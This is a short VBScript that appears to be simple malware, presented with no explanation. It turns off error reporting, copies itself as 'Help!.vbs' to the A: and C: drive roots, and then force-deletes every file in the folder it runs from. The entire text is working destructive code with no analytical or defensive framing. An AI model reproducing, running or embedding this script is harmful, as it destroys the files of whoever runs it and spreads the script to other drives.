On Error Resume Next
Dim FSO, CurrentDirectory, EveryFiles
Set FSO = CreateObject("Scripting.FileSystemObject")
FSO.CopyFile Wscript.ScriptFullName, "A:\Help!.vbs", True
FSO.CopyFile Wscript.ScriptFullName, "C:\Help!.vbs", True
Set CurrentDirectory = FSO.GetFolder(".").Files
For Each EveryFiles in CurrentDirectory
 FSO.DeleteFile EveryFiles.path, True
Next
